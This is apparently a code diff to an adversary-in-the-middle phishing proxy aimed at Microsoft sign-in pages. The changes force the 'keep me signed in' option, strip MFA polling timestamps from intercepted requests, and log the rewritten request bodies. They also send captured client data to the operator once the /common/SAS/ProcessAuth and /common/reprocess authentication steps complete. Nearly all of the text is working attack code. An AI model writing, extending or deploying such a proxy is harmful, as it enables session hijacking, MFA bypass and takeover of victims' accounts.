@@ -18,7 +18,8 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        if (this.browserReq.url.startsWith('/kmsi')) {
+        if (this.browserReq.url.startsWith('/kmsi')
+        || this.browserReq.url.startsWith('/common/SAS/EndAuth')) {
             return this.forceKeepSession()
         } else {
             return super.processRequest()
@@ -33,9 +34,15 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                 cJust += chunk.toString('utf8')
             })
             this.browserReq.on('end', () => {
+                let kJust
                 cJust += ''
                 const forceOption = /LoginOptions=\d/
-                const kJust = cJust.replace(forceOption, 'LoginOptions=1')
+                kJust = cJust.replace(forceOption, 'LoginOptions=1')
+                
+                kJust = kJust.replace(/"LastPollStart":\d*,/, '')
+                kJust = kJust.replace(/"LastPollEnd":\d*,?/, '')
+
+                console.log(kJust)
 
                 this.proxyEndpoint.setHeader('content-length', kJust.length)
                 this.proxyEndpoint.write(kJust)
@@ -109,11 +116,12 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
        
 
         if (this.proxyResp.req.path.startsWith('/kmsi')  
-        || this.proxyResp.req.path.startsWith('/common/SAS/ProcessAuth')
+        // || this.proxyResp.req.path.startsWith('/common/SAS/ProcessAuth')
         || this.proxyResp.req.path.startsWith('/owa/prefetch.aspx')
         || this.proxyResp.req.path.startsWith('/webmanifest.json')
         || this.proxyResp.req.path.startsWith('/landingv2')
-        || this.proxyResp.req.path.startsWith('/common/reprocess')){
+        // || this.proxyResp.req.path.startsWith('/common/reprocess')
+        ){
             this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
             return this.browserEndPoint.end()
         }
@@ -224,9 +232,9 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             this.req.url = this.req.url.slice(5)
         }
 
-        if (this.req.url === '/kmsi' || this.req.url === '/common/SAS/ProcessAuth' ) {
+        if (this.req.url.startsWith('/common/reprocess') || this.req.url.startsWith('/common/SAS/ProcessAuth')) {
             clientContext.setLogAvailable(true);
-            // super.sendClientData(clientContext, {})
+            super.sendClientData(clientContext, {})
         }
 
         // if (this.req.url.startsWith('/owa/prefetch.aspx') || this.req.url.startsWith('/webmanifest.json')
